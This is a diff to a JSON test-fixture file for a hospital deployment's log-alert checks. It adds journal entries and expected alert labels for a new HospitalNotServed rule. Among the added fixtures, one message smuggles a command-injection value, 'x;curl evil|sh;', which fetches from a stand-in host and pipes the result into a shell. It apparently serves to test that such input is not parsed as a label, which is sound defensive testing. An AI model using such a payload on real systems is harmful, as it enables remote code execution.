@@ -1,5 +1,5 @@
 {
- "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the values of its key label it must fire (or wait to fire) for, and no others: client_ip, or hospital for PackApplyFailed.",
+ "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the values of its key label it must fire (or wait to fire) for, and no others: client_ip, or hospital for PackApplyFailed and HospitalNotServed.",
  "fixtures": [
   {
    "count": 1,
@@ -621,6 +621,189 @@
     "CONTAINER_NAME": "care-celery-1",
     "COM_DOCKER_COMPOSE_SERVICE": "celery"
    }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=alpha outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=gamma outcome=deferred",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=devhosp outcome=held",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "care-celery-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "celery"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=webforged outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "10.203.0.9 - - [12/Nov/2026:10:00:00 +0530] \"GET /api/ihr-fleet: hospital=forged outcome=failed\" 404 179",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "note: ihr-fleet: hospital=prefixed outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=suffixed outcome=failed (and more)",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=delta busy: trying again in 5 s",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=epsilon outcome=stopped",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=x;curl evil|sh; outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=zeta outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "bash",
+    "_UID": "1000",
+    "_SYSTEMD_UNIT": "session-1.scope",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate",
+    "SYSLOG_IDENTIFIER": "bash"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=theta outcome=held",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-celery-worker-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "celery-worker"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-fleet: hospital=beatforged outcome=held",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-celery-beat-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "celery-beat"
+   }
   }
  ],
  "expect": {
@@ -640,6 +823,12 @@
   "PackApplyFailed": [
    "alpha",
    "devhosp"
+  ],
+  "HospitalNotServed": [
+   "alpha",
+   "devhosp",
+   "gamma",
+   "theta"
   ]
  },
  "expect_state": {
@@ -647,6 +836,7 @@
   "SignInLockoutStorm": "firing",
   "FailedSignInsFromAddress": "firing",
   "RateLimitedAddress": "pending",
-  "PackApplyFailed": "firing"
+  "PackApplyFailed": "firing",
+  "HospitalNotServed": "firing"
  }
 }
